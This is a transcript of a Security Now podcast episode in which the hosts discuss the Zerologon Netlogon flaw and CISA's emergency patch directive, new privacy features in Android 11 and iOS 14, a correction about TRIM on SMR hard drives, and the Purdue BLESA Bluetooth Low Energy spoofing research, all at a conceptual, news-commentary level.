STEVE:  "All that is required," they wrote, "is for a connection to the domain controller to be possible from the attacker's viewpoint.  Secura's security expert Tom Tervoort previously discovered a less severe Netlogon vulnerability last year that allowed workstations to be taken over, but the attacker required a person-in-the-middle position for that to work.  Now he discovered this second, much more severe" - I was musing, I think it was last week because we talked about something horrible that was a 9.9.  And I said, "Has there ever been a 10.0?"



LEO:  Yes.



STEVE:  Uh-huh.  And this is it, "...CVSS score 10.0 vulnerability in Microsoft's protocol.  By forging an authentication token for specific Netlogon functionality, he was able to call a function to set the computer password of the domain controller to a known value.  After that, the attacker can use this new password" - monkey, I'm sure they're going to use monkey.  They have to, Leo, they absolutely just, you know, they have to set it to monkey.  That's got to be part of the requirement for using this vulnerability.  Anyway, "...to take control over the domain controller and steal credentials of a domain admin."  And of course if you're the domain admin, and you can log into the domain controller, it's game over for an enterprise.



They finish their little quickie:  "The vulnerability stems from a flaw in a cryptographic authentication scheme used by the Netlogon Remote Protocol, which among other things can be used to update computer passwords.  This flaw allows attackers to impersonate any computer, including the domain controller itself, and execute remote procedure calls on its behalf."



Okay.  So Secura named this discovery and vulnerability "Zerologon" because it allows an attacker who initially has zero logon privileges on a network to completely take it over.  If an attacker can establish not even a foothold, a toehold on any machine within a Windows-based enterprise network, there is no longer any containment.  You've talked, Leo, about laterally moving within an enterprise.  I mean, this just opens up all access.  If malware finds some way, anyway, to run on any workstation, on any large Windows domain-based enterprise, it can obtain free rein over the entire network.  It's able to trivially overwrite the credentials of the domain admin, resetting the password and completely taking over the enterprise.  So that was Monday, eight days ago.



LEO:  Oh, boy.



STEVE:  What happened next?



LEO:  Oh, boy.



STEVE:  It won't surprise anybody.  Secura's reported details, coupled with how juicy exploitation of this would be, and of course the opportunity to actually use the password "monkey" on a domain, it motivated the world's hackers, donning hats of all shades to quickly create weaponized proof-of-concept exploits that went public within hours of Secura's report.  And the result of that is that the U.S. Department of Homeland Security CISA, last Friday afternoon, issued Emergency Directive 20-04.  It's titled "Mitigate Netlogon Elevation of Privilege Vulnerability from August 2020 Patch Tuesday."  And it's not a request.



After citing a few relevant sections of the Homeland Security Act of 2002, which gives the DHS authority to compel action on the part of any federal information system administrator, the directive says:  "On August 11th, 2020, Microsoft released a software update to mitigate a critical vulnerability in Windows Server operating systems."  And then they cite CVE-2020-1472.  "The vulnerability in Microsoft Windows Netlogon Remote Protocol (MS-NRPC), a core authentication component of Active Directory, could allow an unauthenticated attacker with network access to a domain controller to completely compromise all Active Directory identity services.  Applying the update released on August 11th to domain controllers is currently the only mitigation to this vulnerability," they said, "(aside from removing affected domain controllers from the network)," which of course is impractical.



"CISA has determined that this vulnerability poses an unacceptable risk to the Federal Civilian Executive Branch and requires an immediate and emergency action.  This determination is based on the following," and they have five bullet points:  "The availability of the exploit code in the wild increasing likelihood of any unpatched domain controller being exploited; second, the widespread presence of the affected domain controllers across the federal enterprise; the high potential for a compromise of agency information systems; the grave impact of a successful compromise; and the continued presence of the vulnerability more than 30 days since the update was released."  In other words, they have checked, and people have not updated from August, a month later.



LEO:  It was part of the Windows patches, though; right?



STEVE:  Yes, yes.  And it turns out, Leo, people actually aren't patching.



LEO:  Oh, no.



STEVE:  They're just saying, okay, well, we'll get around to it.  Everything seems fine right now.  We're busy.



LEO:  You know, our IT guy, Russell, I know you know who he is, he's really good.  He's noticed some clients apparently have applied the patch, but apparently there's more that you have to do besides merely install the patch.  There's a switch you need to flip or something.  And they're thinking they're fixed when they've merely installed the patch.  I don't know anything about that.  I haven't tried it.  But apparently there's more that you need to do.



STEVE:  So I don't think I put it in the show notes, but Secura has a utility that can be used to verify whether or not systems are vulnerable.  So I'll keep proceeding here because I've got three links, for example, to the GitHub stuff.  Anyway, so they finish, saying under Required Actions:  "This emergency directive requires the following actions:  Update all Windows Servers with the domain controller role by 11:59 p.m. Eastern Daylight Time, Monday, September 21, 2020."  In other words, last midnight.  By last midnight.  Here we are on Tuesday.  Midnight at the end of the day on Monday, the 21st, this thing mandated, period, no excuses, this is an emergency.



In their whitepaper, Secura wrote:  "This attack has a huge impact.  It basically allows any attacker on a local network, such as a malicious insider or someone who simply plugged in a device to an on-premise network port, to completely compromise the Windows domain.  The attack is completely unauthenticated.  The attacker does not need any user credentials."  Due to the severity of the problem and trying to do the right thing, even with publishing the whitepaper, Secura said they had developed their own exploit that works reliably; but, given the risk, they weren't releasing it until they were confident Microsoft's patch had been widely installed on vulnerable servers.



So they did the right thing.  They waited six weeks.  Turns out that's not long enough.  They warned, however, that it's not difficult to reverse engineer Microsoft's patch to develop an exploit.  And sure enough, GitHub is now hosting at least three exploit scripts.  I've got the links in the show notes for anyone who's interested.



Okay.  So the technical side of this will be interesting to our listeners.  As long as an attacker has the ability to establish a TCP connection to any unpatched domain controller, the attack can be launched.  The vulnerability originates from the Windows implementation of the AES-CFB8 encryption.  So we know that the use of the robust AES cipher in a cipher feedback mode is this CFB, Cipher Feedback, CFB.



We've talked a lot about cipher modes in the past.  It's not enough to have a cipher like AES that can, under the influence of a key, map any combination of 128 bits into another unique combination of 128 bits.  That's what it does.  That's necessary, but not sufficient to actually come up with a useful security protocol because, for example, under any given key, the same 128-bit input will always produce the same 128-bit output.  This means that the cipher will be leaking a great deal of information when it's used to decrypt a lengthy message because, if any parts of the source message repeat, the encrypted message will repeat, if it's just 128-bit to 128-bit mapping.  And, for example, if a message always begins the same way, the encrypted result will always be the same, which you don't want bad guys to know about.



So using a cipher algorithm in this way, in order to sort of put a wrapper around the cipher, is the way to go.  If you didn't do that, if you just used something like a direct mapping, we call that ECB, Electronic Code Book mode.  And it is for most applications not safe.  We've solved these problems by using the cipher as the core of a larger encryption solution.  Windows uses this AES-CFB for its mode.



So one of the ways to prevent the problem of the same plaintext message always producing the same encrypted message, is by introducing what's known as an "initialization vector."  That's just a fancy term for deliberately introducing some varying material deliberately, like seeding the start of the encryption with something that changes so that something, anything is changing every time the encryption occurs, even if the message being encrypted does not change.  And the result will be that the encrypted output always will change.



So what happened here in this case with AES-CFB8, the initialization vectors must be unique for each message.  That's generally a requirement.  Often, as we've talked about this before, they don't even have to be secret, and oftentimes they're not.  But they have to be unique.  It turns out that Windows failed to enforce that requirement upon its implementation of AES-CFB8, and the Zerologon vulnerability exploits this failure by sending Netlogon messages that include zeroes in various carefully chosen fields.  The Secura write-up provides a very deep dive into the cause of the vulnerability and also offers a complete roadmap for how to exploit it, which is why shortly after it was published last week, proofs of concepts started popping up.



So it turns out that fixing the problem is a bit of a mess, and it's going to break some things because there are places where non-Windows devices are deliberately not using secure Remote Procedure Calls (RPCs).  And Microsoft has determined that cannot be allowed to stand in the long term.  So Microsoft will be updating Windows in two stages.  The first stage is what happened in August, which they released last month.  In addition to fixing this initialization vector bypass, this first update also prevents Windows Active Directory domain controllers from accepting any unsecured RPC communications from other Windows endpoints.



And so Leo, I think this is probably how SMB ties in.  SMB might by default be using some unsecured RPC communications which are no longer permitted.  And so as a consequence of August's change, only secured RPC communications are allowed.  So you'd have to turn on, explicitly turn on SMB security in order to still be able to connect to Windows.  So again, they know this is breaking some things.



LEO:  Yeah.



STEVE:  And because there are non-Windows endpoints which will have a problem, Microsoft has introduced logging.  It will continue to permit, but log any non-Windows devices that are authenticating themselves over unsecured RPC connections.  And so by monitoring this log, network admins will be alerted to any devices they have which will need to be updated before next February because that's when the grace period comes to an end, on Patch Tuesday, which will be February 9th of 2021, assuming that the Earth still exists.  Microsoft will be...



LEO:  Do you know something we don't?



STEVE:  Microsoft will be releasing a second update that will fully enforce the use of only secure RPC across the domain.  Even then, admins will be allowed to make specific exceptions.  But really, everybody is encouraged not to.  So this is a two-step process.  It's interesting that DHS felt that they were forced to elevate this to emergency directive.  Nobody in the federal government has a choice.  You must do this by last night.  Last midnight.  Which is six weeks downstream and two Patch Tuesdays from when this happened.



It just, I mean, I'm not on the front lines of IT in an organization like that.  But there are lots of federal agencies, and maybe having any downtime is a problem.  I mean, I can't guess why it would be that they wouldn't be applying patches.  At the same time, how much time are we spending talking about all the problems that patches do create?  If we talk about how IT, you know, they have to stage this.  So if you've got a server that can't be down, certainly can't be broken by an update, I can see putting off the need.  They probably read over these things and think, oh, well, that doesn't sound good.  No, that doesn't sound good.  Oh, that's not good.  But if nothing is critical happening right now, we'll wait a little bit.



And so this is DHS saying, okay, no more.  We have a tool, and that is part of what Secura created.  I do not have the link in the show notes.  So anybody who's interested can find it if you just put in "Secura," S-E-C-U-R-A, and "Zerologon," you'll go to their blog page, and you can find this tool that they have.  There are also some links in some of the popular coverage of this on the 'Net.  That would allow you to determine if there's a problem.  The point is, our takeaway ultimately is that working exploits are on GitHub.  All it takes is someone who's forgotten their anti-phishing training.



There was an article that I saw that didn't make it into today's podcast saying that some studies have shown that phishing training, in other words, do not click that link no matter how authentic it looks, fades after about six months.  And so they're finding that it's necessary to refresh this training probably sooner than that, every four months, just to remind people that this is still a problem.  I mean, I find myself having, when I come across something really bad, sending a note to Sue and Greg and say, I know you know this, but just really, really, really be careful, please, because it's necessary.



So they know this is going to end up getting exploited.  It would be interesting to see, like, what effect this emergency order had.  Hopefully our federal government is protected.  Unfortunately, we know that that's a fraction of the number of domain controller systems in use in enterprises around the world.  And if there's any similar sloppiness happening because people are saying, you know, they pause downloads until they're able to get around to it and verify that it's not going to cause problems, well, you may find yourself with a much bigger problem  than installing an update that you could always back out of if it had a problem.



Our smartphone mobile OSes are acquiring new privacy and security features, both behind the scenes, which is always a good thing, and also more visibly.  And they are, as a result, gradually becoming more secure.  As I thought about the things we're going to talk about here, looking at useful user-facing features that Android and iOS have just added, Android 11 and iOS 14, it's easy to wonder why these features were not previously present.  And I think the answer is that they do further complicate the user's experience by requiring more attention and engagement.  We'll talk about iOS new features next.



But for example, iOS 14, I mean, yeah, we'll talk about iOS in a second.  But one thing I deliberately didn't mention then is an iOS feature which places a tiny orange dot at the top of the screen to indicate that the application has previously been given and currently has permission to use the smartphone's microphone and camera.  It's supposed to be sort of a - look like a recording indicator.  It's not red; it's orange.  And given the original deliberately imposed simplicity of the Apple iPhone user interface, there was certainly a time when notifying the user of this would have been considered noisy and unnecessary.  The point is, that's clearly no longer true.  The goal and desire to keep it simple has not diminished.  But what has changed, against the best interests of smartphone users, is the nature of today's threat landscape.  It is far more active than ever.  So smartphone users need to get all the help that they can get from their OS.



Okay.  So to this end, we now have Android 11, which brings billions of its users, those who can upgrade and all those who purchase Android 11 devices in the future, more control over their security and privacy than they've had before.  And yes, it's unfortunate that such control is necessary; but it's better to have it, I would say, than not at this point.  And it's not like super intrusive anyway.



Okay.  So what's new in Android 11?  One-time permissions.  Android 11 users get a useful feature that iOS has had for some time.  This allows users to grant apps single-use access to their devices' more sensitive permissions, such as location, microphone, and camera.  We're seeing variations of this on different platforms.  For example, when a permission might be semi-permanent, users will be reminded after a while that such and such an app still has such and such a permission, and asked whether the app should retain it or not.  Which is sort of a nice compromise between immediately removing it and sort of being kinder and gentler.



So Android 11 will now autonomously revoke permissions.  In addition to having the single use, Android 11 has the ability to autonomously revoke permissions for long-unused apps.  It could be a bit of annoyance, though those permissions can always be regranted.  But this is sort of part of working to keep the  casual user more safe while attempting to minimize the impact of enforcing that safety.  And in general, we'll be talking here about this notion of minimum required permissions.  That's always a good idea.  We've talked about how firewalls flipped from once blocking known problem ports to blocking everything, and only opening the ports which are known to be needed to be open.



In what I think is a huge win for Android 11, the OS will also be getting incremental updates.  Google has increased their plug-and-play store's integration on Android 11, allowing those devices to directly download and install critical OS security patches as modules, instantly, just like an app from Google Servers.  We talked about the plan for this a long time ago, the idea that the OS would get modularized, and that Google would not have to force, you know, these would only be made available through the long OEM loop to a third party and hopefully to the end user, but rather be delivered as part of the app store, much more like the Apple model has always been.  And that's now here.



So, boy, I think that's going to be a huge welcome improvement.  And it would sure be nice for everybody to be able to get 11.  I'm not sure how far back 11 will be made available to earlier devices.  But once you get there, you have a chance of being kept current.  Which is fabulous.



Also it tightens up an app's right to obtain location information when it's in the foreground, versus moving in the background.  We'll talk about iOS, which has done some interesting things there, as well.  When an app requests permission to access the user's location, Android 11 initially only grants foreground location permission, that is, while the app is in use actively.  If the app additionally desires access to location information while it's in the background, such apps will now be required to produce a separate and independent permission request.  It's not all just lumped together into location services.  And granting the permission is not as simple as quickly clicking yeah, yeah, okay, whatever.  No.



Now, to enable background location access, users must go to a settings page and set an "allow all the time" option for the app's location permissions.  And even to obtain such a permission setting, Google will now be requiring their app developers to explain why their app needs background location access at all.  Just wanting it just because, that's no longer going to be enough in order to get it.  So a bunch of nice improvements in Android 11.  It's clear they're all going to help improve user security, especially the from-the-store OS updates, which I just think that's going to make a world of difference for so many and for the security of so many Android users.  Yes, there's more for the user to do.  It requires more involvement from the user.  But I think that's necessary as we go forward.



And as for iOS 14, the list of iOS updates and improvements, I scanned through it.  It is overwhelming.  And being an iOS user myself, I'm beginning to feel more and more as though I barely know how to use the device in my pocket.  Oh, Leo.  That's just crazy.  I saw you jumping around with...



LEO:  Oh, those widgets, yeah.



STEVE:  Oh, my.  Customizing things and locking things in place.  And it's like, okay.  I mean, really it's not the phone that Steve Jobs gave us all those years ago.



LEO:  No.  The nice thing is you don't actually have to do any of that stuff.  And the most important improvements are what you already talked about, the same with Android, which is it now pops up warnings and lets you know what's going on.  And you'll get that no matter what.  So I think they're kind of on the right track.



STEVE:  Yeah, yeah.  And my hope is that these things are discoverable so that it's kind of like, well, you know, will it do this?  Oh, look, it does.



LEO:  It does, yeah, exactly.



STEVE:  And then you are able to do it.  Yeah, I immediately pinned a few of my most used iMessage contacts.



LEO:  Yes, in the messages is nice.  Yes, I do that.



STEVE:  It's a little jarring.  I'm not used to it yet.  It kind of, you know, every time I bring up iMessage it's like, whoa, okay.



LEO: Yeah, got these heads; right?  Yeah. 



STEVE:  Yup, exactly.  Exactly.



LEO:  And when somebody talks to you on those heads, you'll have a little pop-up there, which is kind of fun, yeah.  I have to add you to it, though.  I'm going to put you in there.  You've been texting me a lot lately.



STEVE:  There's been more going on, yeah.  That's true.  Okay.



LEO:  We're commiserating together.



STEVE:  Yes.  With iOS 14 they did something that I just think is brilliant.  They have restricted access to the LAN.  Apple noticed that while we're at home, very few of our apps have any need to access any devices on our home network.  All they need is to see our broader router and the wider Internet.  I'm sorry, our border router and the wider Internet.  And of course in this era of IoT local network access, some apps certainly do have a need for local LAN access.  But it is typically limited to one or two or a small number of explicit IoT-interfacing apps.  I think this is just brilliant that they noticed it.



LEO:  It's interesting.  Because Apple has a WiFi backup which they prefer you use to iCloud for your phone.  But it's not using - it's not backing up to, I mean, even on your computer you can have WiFi backup, but I bet you it's going through the cloud and down again.



STEVE:  It might be.  Or since the OS is in control, they're able to give [crosstalk] themselves.



LEO:  Right, right.



STEVE:  Yeah, if they wanted to.  So here's what they realized that I think is so cool.  The vast majority of our phones' apps are entirely ignorant of what's going on on our home or our corporate LAN.  And the wisdom of always and only granting minimal rights teaches that by default no apps should have local LAN access.  They don't need it.  And only those apps that actually require it should have it granted to them.



So what that means is, if an app is malicious, if it gets onto the App Store, if it gets by Apple scrutiny, if it gets updated and then has some behavior that would otherwise have allowed it to get onto your LAN and be a far more devastating consequence, iOS just says no.  That app won't have access unless there's a reason for it to.  So yeah, a few will.  But I just think that this idea of by default restricting apps to only the Internet is a tiny brilliant perfect solution for increasing the security of our systems.



Also, back in 2014, when iOS 8 added, I guess you'd call it unassociated MAC address randomization, we talked about this six years ago.  The idea was that it was an anti-tracking measure.  Normally a WiFi radio has an Ethernet MAC address.  As we know, it's a 48-bit address.  It's the pair of hex digits separated by colons which uniquely identify that piece of hardware, the intention is globally, 48 bits.  It used to be fixed.  Then people started worrying that, well, wait a minute.  My phone is broadcasting my hardware radio Ethernet MAC address all the time, wherever I go, making it trivial to track me by my MAC address.  So Apple said, okay, we're going to compromise here.  As long as your phone has not associated with an access point, we're going to broadcast a random MAC because, after all, who cares?  It doesn't matter what it is.  But when you associate with an access point, then we will revert to the actual MAC for the device.



iOS 14 has taken that a step further.  If you look under WiFi, Leo, if you haven't already, in your settings under the WiFi your phone, your iOS device is currently associated with, there is a new switch turned on by default, private address.  What that does is it synthesizes a unique MAC per access point.  Because the one thing that was still possible before was that when you associated with a MAC, then you would be giving that access point your actual MAC.



LEO:  He's back, yeah, yeah.



STEVE:  Yes.  So you were still trackable to the degree that you associated with access points.  Now, every different access point you associate with, by default, iOS 14 will synthesize a unique MAC for that access point.  So it's able to identify you uniquely, but you are nontrackable.  Actually, it's exactly the way SQRL works with SQRL identities; right?  Every time you go back to that same website, SQRL identifies you as a unique identity.  Yet every different site you go to gets a different identity.



LEO:  Right.



STEVE:  So iOS has done that with our MAC addresses on our iPhones.



LEO:  Does this confuse MAC address filtering?



STEVE:  Well, that's probably why you can turn it off is that it might be, for example, in an enterprise setting they're doing MAC address filtering.  Now, as we know, MAC address filtering is weak because the MAC address is in public; right?



LEO:  It's broadcast, yeah.



STEVE:  Yeah.  That's why we've never...



LEO:  It's easy to spoof.



STEVE:  Yes, we've never promoted it as anything really useful because a bad guy can see what MAC addresses are on the network being accepted and just adopt one of them on the fly.  So not much security there.  But so my guess is maybe in an enterprise you might need to turn it off if, for example, privileges were granted to you as you roamed among access points in an enterprise.  There you might want to have it turned off.  But it is switchable on a per-network mode.  So again, they did the right thing.  It's defaulted on all the time.  So everybody automatically gets this protection.  Only if it causes a problem might you need to turn it off.  And I imagine that the provisioning system that enterprises have with iOS devices would allow them to do that just automatically, too.  So very, very cool.  Again, a nice piece of new technology from Apple.



As is what I call "fuzzy location services."  With GPS in our phones, of course, the phone knows precisely where it is, even which direction it's facing at all times.  So it's possible for apps to be granted that same awareness, as well.  But as with LAN access, not all apps have the actual need for that level of location precision.  Exact location can compromise privacy.  And by the way, Leo, this is what I was trying to remember.  It turns out there are ad networks which obtain the location of the user as part of their tracking.  So talk about another breach of privacy aspect.



So what Apple realized is that, very much as with LAN access, not all apps have the actual need for that level of location precision.  Exact location can compromise privacy.  But there are some that do have a need.  For example, whereas a driving navigation app does need to know precisely where you are, a weather app only needs to know your approximate location, within several miles of where you are, to do its job.  So again, they follow this concept of not disclosing anything more than is actually necessary.  And fuzzing your location for apps that don't need pinpoint location is now part of iOS 14.  And again, bravo.



Couple more things.  Of course the invention of a shared system-wide copy-and-paste clipboard was one of the many brilliant innovations to arise from the user interface work that was done at Xerox PARC for their Alto system.  But as we know, with great power comes great responsibility.  And the irresponsible or malicious capture of our instantaneous clipboard content has been a longstanding security problem.  We've talked about it often.  And believe it or not, in that continuing quest to track us, there are also ad networks used in apps that continually spy on our clipboard contents, as yet another means of locking onto and following us wherever we go.  Just, again, they've been very clever, to their credit, but really at a cost of real intrusion of privacy.



iOS 14 adds a notification every time an app accesses the clipboard.  We talked about this as a coming feature some months ago, and in fact remember that it had outed a number of apps that were doing this constantly and caused their developers some embarrassment.  And so at the time I said I think this is just the greatest thing to ever happen.



LEO:  Including TikTok, by the way.



STEVE:  Yes.  Yeah.  It's like, okay, why are you looking so much?  Yeah.  And because some apps do not have a legitimate need, at the developer level Apple has included new APIs to allow apps to quietly ask iOS what sort of contents the clipboard contains without needing to obtain it and thus trigger a notification.  In other words, so there are apps that do have some reason for wanting to look at the clipboard.  But if they simply do a copy, it will pop up this notification.  And as often as not, the information there is not for them.



So what Apple has added in order to quiet this otherwise rather noisy, at least at first, noisy new but really cool feature, they've added the ability for an app to ask for the type of information on the clipboard.  If it's not a URL, for example, for an app that only needs URLs, it's able to ask, but not pop something up, and vice versa, and all kinds of other stuff that you might be putting on your clipboard.  So again, Apple was clever in trying to keep the visual noise down.  But boy, a tip of the hat for the fact that they are going to be popping up a notification whenever that happens.  Again, a perfect example of the kind of thing that on the iPhone's launch so many years ago would have just made no sense.



LEO:  They didn't even have cut and paste in the original iPhone.



STEVE:  Is that true?  There was no inter-app?



LEO:  Yeah, there was no clipboard.  No.



STEVE:  Whoa.  Wow.



LEO:  That was actually a huge missing feature that people complained about for months.  They eventually added it.  



STEVE:  And in fact there were no apps in the beginning.



LEO:  There were no apps.



STEVE:  It was just a half-filled home screen that looked like, well, wait a minute; you know?



LEO:  And Steve said at the time, and actually it was prescient, you could use a web page for most apps.  And now you could with progressive web apps.  But Apple doesn't really support it very well.  So everywhere but Apple.  It's come around full circle.



STEVE:  So two last little bits of Safari improvement.  As is vogue in these days, Safari now has also gained the ability to check whether any of the passwords it has saved for its users may have appeared in any known password breach data dumps.  And of course it does this safely, without revealing the password collisions to anyone but its user, who might then wish to change their publicly disclosed password, now knowing that it is present in some data breach.  One of the things that we know the brute forcers are doing is they take those lists as their seed material.  Before they start doing algorithmic brute forcing, they try all of the known passwords, knowing that people tend to reuse them.  And even if it wasn't reused, maybe the breach was in a site where you're trying to log on.



So anyway, Safari now has password breach notification built in.  And there's a website privacy report.  I tried it, but mine hadn't been used enough yet in order to have acquired any information.  It told me, yeah, we don't know enough yet.  But you're able to tap a privacy report button to view all the cross-site trackers that are being blocked by Safari's intelligent tracking prevention system to get some sense for the work it's doing to help you and also, on the flipside, which sites you're going to are exhausting themselves trying to support tracking.



So overall, both Android 11 and iOS 14 have given us a bunch of welcome improvements, both behind the scenes and also some things that are going to be coming to the attention of their users as necessary.  And, boy, I just tip my hat to the cleverness that iOS has offered in terms of just restricting the presence of unneeded information of all kinds.  They've done a great job.



LEO:  Yeah, increasingly I've moved towards the iPhone platform.  I love Android for its customizability, but it's nice to know that you're relatively secure on your iPhone.



STEVE:  And it sure does seem like iOS is catching up on that customizability side.



LEO:  Oh, yeah, absolutely.  With widgets, that's a big improvement, yeah.  Yeah, I think they're getting closer and closer together, both of them.  I mean, Android's done, as you pointed out, a lot of great privacy stuff, too.  And now, let's talk errata.



STEVE:  So as the sun has set...



LEO:  You're getting darker and darker, yeah.



STEVE:  Beginning to look like a disembodied head.



LEO:  I love it.



STEVE:  Okay.



LEO:  That's fine.  That's good.  I like it.



STEVE:  Put up with it for once.  Okay.  We have a bit of errata.  Thanks to some feedback from some knowledgeable folks hanging out in GRC's Security Now! newsgroup, I learned that although it's clearly wrong for Windows to be issuing TRIM commands to hard disk drives that do not accept them, and thus are logging errors, there are drives, strangely enough, which employ a storage density increasing technology known as Shingled Magnetic Recording (SMR).



LEO:  Oh, yeah, SMR.  Oh, yeah.  Oh, yeah.



STEVE:  Yup.  This Shingled Magnetic Recording can increase the storage density of a shingled drive by around 25%.  But the technology is tricky because, just as with an SSD, where a partial update is time-consuming and expensive because like a whole region needs to be rewritten at once, similarly these SMR drives can also benefit from being affirmatively notified by the operating system when regions of their storage no longer contain active file system data, and therefore do not need to be rewritten as part of a nearby update.  In other words, there's a use for TRIM commands on hard disk drives, not just on solid-state SSDs.



So it's not entirely, well, it is entirely nuts for Windows 10 to be issuing TRIM commands to drives that say I don't know what you're talking about and to continue to do so.  But there are some spinning drives where it does make sense.  So anyway, I wanted to say I stand corrected on the idea that no spinning drive can make use of TRIM.  It turns out there is an application for it.



Someone whose Twitter handle is unfortunately, well, it looks like it's @mehtechie, M-E-H-T-E-C-H-I-E, he had a good experience that I just wanted to share and reinforce it for anyone who might have forgotten this.  He tweeted:  "I just wanted to say thank you so much for InitDisk.  Just rescued a previously thought completely dead 2TB Crucial SSD."  And so again, that's one of the things that we discovered while we were developing InitDisk.  Remember that InitDisk was the work I did to create a new thumb drive formatting and prep tool which will be part of the next SpinRite.  Actually, it's going to be part of the forthcoming benchmark test also because it'll init a thumb drive to boot DOS, and that will also have the benchmark on it.



But what we found was that there were a number of instances where people had thumb drives that just no longer worked.  They just - nothing worked on them.  InitDisk brought them back to life.  And in this case a 2TB Crucial SSD, that's a nice piece of hardware, so it's cool that it did that.  So I just wanted to share that.



And GRC's new forum system is up and running, and SQRL is working perfectly there.  All of those final edge cases that I referred to last week appear to have been resolved and eliminated.  So I'm pulling the final benchmark together.  I've named it ReadSpeed, since that's what it is.  We'll be doing a pre-release round of testing in the newsgroup first.  Then I'll have something soon for the wider world to play with, as well as a readily accessible place for ReadSpeed's users to hang out and interact.  So some fun stuff coming soon.



Okay.  Formal verification.  It's clearly where we're headed.  At this point I would say that the technology is still emerging and maturing, that is, the technology required to create a language or a description process which - and it's kind of AI-ish - which allows you to describe to a computer-based system at a detail level how a security protocol is designed, tell it what characteristics you want that protocol to have, and then ask it did we achieve our goal with this design.



And I say that it's clearly still emerging and must be maturing because we're still seeing too many complex protocols being developed just in an ad hoc manner.  Yeah, a bunch of smart guys get around, sketch something out, hopefully not on the back of a napkin, maybe on a whiteboard, and say yeah, that looks about right.  What do you think?  And they all agree, and somebody writes it up, and now we have WiFi or Bluetooth or whatever.  And what we also unfortunately keep having are problems with those protocols.



There's two types of problems.  There's implementation problems, which would be somebody read the spec and didn't code it correctly.  So for example, any buffer overrun would be an implementation problem.  Nothing wrong with the specification.  The spec doesn't talk about where buffers are.  It talks about how large they have to be.  But implementing it in an insecure way, that's the implementer's fault, not the spec writer's fault.  It's the spec that says this is how the system should work.  So there's implementation separate from specification.



Okay.  So let's first step back and take a look at another new vulnerability.  We keep talking about these.  And what's interesting is it was found.  It was previously unknown to the world.  It was found when the seven researchers at Purdue were wanting to check out Bluetooth Low Energy protocol and succeeded in using an automated verifier to do that.



Okay.  So once again we have alarming headlines:  "Billions of Devices Vulnerable to New BLESA (B-L-E-S-A) Bluetooth Security Flaw."  Another headline read:  "Bluetooth Spoofing Bug Affects Billions of IoT Devices."  And so yes, here we are again, week after week.  The research into this was conducted by a bunch of guys, as I said, at Purdue; and their research is titled "BLESA" - and that's Bluetooth Low Energy Spoofing Attacks, B-L-E-S-A.  Anyway, the title is "Spoofing Attacks Against Reconnections in Bluetooth Low Energy."  And so I'll share the abstract from their paper.



They said:  "The Bluetooth Low Energy protocol ubiquitously enables energy-efficient wireless communication among resource-constrained devices.  To ease its adoption, BLE requires limited or no user interaction to establish a connection between two devices.  Unfortunately, this simplicity is the root cause of several security issues.  In this paper, we analyze the security of the BLE link layer, focusing on the scenario in which two previously connected devices reconnect.  Based on a formal analysis" - that's the key - "a formal analysis of the reconnection procedure defined by the BLE specification, we highlight two critical security weaknesses in the spec.  As a result, even a device implementing the BLE protocol correctly may be vulnerable to spoofing attacks.



"To demonstrate these design weaknesses and further study their security implications, we develop BLE spoofing attacks.  These attacks enable an attacker to impersonate a Bluetooth Low Energy device and to provide spoofed data to another previously paired device.  BLESA can be easily carried out against some implementations of the BLE protocol, such as the one used in Linux.  Additionally, for the BLE stack implementations used by Android and iOS, we found a logic bug enabling BLESA.  We reported these security issues to the affected parties, Google and Apple, and they acknowledged our findings."



Okay.  Then these guys share some important and useful background.  They explain Bluetooth Low Energy is the most widely used low-energy communications protocol; and, by 2023, the number of BLE-capable devices is expected to reach five billion.  The BLE protocol - so anyway, the good news is it's not too late to get to the ones that haven't been created yet.  The BLE protocol enables wireless short-range communication which allows two devices to connect and exchange data.



A typical usage scenario consists of a smartphone and a gadget device such as a fitness tracker, for example, that communicate over BLE.  Every BLE connection involves a device acting as a client, in this example the smartphone, and another device acting as a server, in this example the fitness tracker.  The first time two devices connect, allowing them to exchange data, they perform a specific pairing procedure which varies depending on the type of the connected devices and their user-interfaces' capabilities.  And of course we've covered all manner of these in the past.



They said the major factors that have helped the rapid growth of the adoption of BLE-enabled devices are its low cost and the minimal setup effort required for end users.  Unfortunately, previous research has shown that these user-friendly features have a negative impact on the security of this protocol.  Right?  The famous tradeoff of convenience versus security.  This concern is particularly worrisome since Bluetooth Low Energy communication is often used in security-sensitive devices such as physical safety devices like locks, or health monitoring devices like medical implants.



Researchers have pointed out and studied many implementation weaknesses in the BLE protocol by manually analyzing its specification.  Manually analyzing.  Additionally, some previous work has performed a formal automated analysis of the BLE specification.  However, these formal approaches only focused on limited aspects of the entire protocol, such as the BLE pairing mechanism.  This limitation is due to the fact that it is challenging to fully formalize and automatically analyze the Bluetooth Low Energy specification.  The challenges stem from the complexity of the Bluetooth Low Energy protocol, difficulties in modeling its multilayer design; right?  I mean, you don't know where the problem's going to be, so you've got to model the whole thing - and its multiple variants and optional features which allow this protocol to support a wide range of devices with significant different capabilities.



"In this paper we study a previously unexplored mechanism of the Bluetooth Low Energy protocol.  Specifically, we focus on the mechanism of dealing with reconnecting two previously connected devices.  This mechanism comes into play when, for instance, a server device, the fitness tracker, moves out of the BLE wireless communication range of a connected client, the smartphone.  And then at a later time the two devices get close enough to reestablish a connection."



Okay.  So what we have now is a new awareness of a critical exploitable flaw in the reconnection of all the Bluetooth Low Energy devices we're using right now.  I mean, this exists today.  It's not theoretical.  As we know, reconnections occur when the Bluetooth devices move out of range and then back into range.  So normally when reconnecting, the two Bluetooth Low Energy devices should check each other's cryptographic keys which were negotiated during the original pairing process and reconnect and continue the exchange of their data.



But what the Purdue team found was that the official Bluetooth Low Energy spec did not contain sufficiently precise and strong enough language to describe the reconnection process.  So there's a little bit of sloppiness.  As a result, two systemic issues have made their way into Bluetooth Low Energy software implementations and down the hardware supply chain to us.  First, the authentication during the device reconnect is optional instead of mandatory, if you can believe that.  It's like, what?  The authentication during the device reconnection is optional instead of mandatory.



The second problem, the authentication can potentially be circumvented if the user's device fails to enforce the IoT device to authenticate the communicated data.  Again, the authentication can potentially be circumvented if the user's device fails to enforce the IoT device's authentication of communicated data.  These two issues leave the door open to a BLESA attack, during which a nearby attacker is able to bypass reconnection verifications to send spoofed data to a Bluetooth Low Energy device.



So it turns out that, despite the somewhat vague language that the Purdue guys found in the spec, the problem is not present in all BLE real-world implementations.  The researchers analyzed multiple software in the real world used to support Bluetooth Low Energy on various OSes.  They found that BlueZ, which is used in Linux-based IoT devices, and Fluoride, which is used for Android, and the iOS Bluetooth Low Energy stack were all vulnerable to BLESA attacks, while the Low Energy stack in Windows devices was not.  It was immune to these.



